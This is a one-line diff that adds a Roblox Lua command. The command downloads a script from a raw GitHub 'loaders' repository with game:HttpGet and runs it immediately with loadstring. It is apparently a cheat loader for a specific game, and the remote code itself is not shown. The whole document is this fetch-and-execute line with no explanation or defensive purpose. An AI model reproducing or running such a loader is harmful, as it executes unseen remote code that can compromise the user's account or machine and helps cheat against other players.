@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/cure-violence-district-s2-mwjal47xdjmckk.lua"))()
